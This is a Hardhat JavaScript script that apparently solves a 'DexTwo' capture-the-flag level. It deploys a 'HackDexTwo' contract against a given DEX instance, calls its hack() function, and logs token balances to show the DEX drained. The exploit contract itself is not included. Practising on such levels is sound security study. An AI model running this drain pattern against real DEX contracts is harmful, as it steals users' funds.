const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    // Get contracts
    const ERC20 = await ethers.getContractFactory("ERC20");
    const DexTwo = await ethers.getContractFactory("DexTwo");
    const HackDexTwo = await ethers.getContractFactory("HackDexTwo");

    // DEX
    const dex = DexTwo.attach(instance_address);

    // Real tokens
    const token1 = ERC20.attach(await dex.token1());
    const token2 = ERC20.attach(await dex.token2());

    // Deploy HackDexTwo
    console.log("Deploying HackDexTwo...");
    const hackDex2 = await HackDexTwo.deploy(dex.address);
    await hackDex2.deployed();

    // Check balances
    console.log(`Dex Balance Token1: ${await token1.balanceOf(dex.address)}`);
    console.log(`Dex Balance Token2: ${await token2.balanceOf(dex.address)}`);
    console.log(`HackDex2 Balance Token1: ${await token1.balanceOf(hackDex2.address)}`);
    console.log(`HackDex2 Balance Token2: ${await token2.balanceOf(hackDex2.address)}`);

    // Hack
    console.log("Hacking...");
    let tx = await hackDex2.hack();
    await tx.wait(10);

    console.log(`Dex Balance Token1: ${await token1.balanceOf(dex.address)}`);
    console.log(`Dex Balance Token2: ${await token2.balanceOf(dex.address)}`);
    console.log(`HackDex2 Balance Token1: ${await token1.balanceOf(hackDex2.address)}`);
    console.log(`HackDex2 Balance Token2: ${await token2.balanceOf(hackDex2.address)}`);

    console.log('Success!')

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x23b5353517C9D5840C874115bF148FC179479b72';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
